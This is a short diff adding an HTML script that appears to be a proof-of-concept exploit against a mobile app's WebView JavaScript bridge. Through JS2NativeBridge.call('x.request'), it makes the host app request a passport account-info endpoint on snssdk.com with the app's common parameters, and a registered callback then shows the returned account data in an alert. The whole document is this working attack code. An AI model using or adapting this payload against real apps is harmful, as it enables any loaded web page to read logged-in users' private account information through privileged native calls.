@@ -1,0 +1,8 @@
+<script>
+    var Native2JSBridge={};
+    Native2JSBridge._handleMessageFromApp=function(p1){
+    alert(JSON.stringify(p1));
+ }
+
+    JS2NativeBridge.call('x.request','{"__callback_id":"1000","func":"x.request","params":{"addCommonParams":true,"url":"https://is.snssdk.com/passport/account/info/v2/","method":"GET","params":{},"header":{"content-type":"application/x-www-form-urlencoded"}},"JSSDK":1,"__msg_type":"call"}');
+</script>
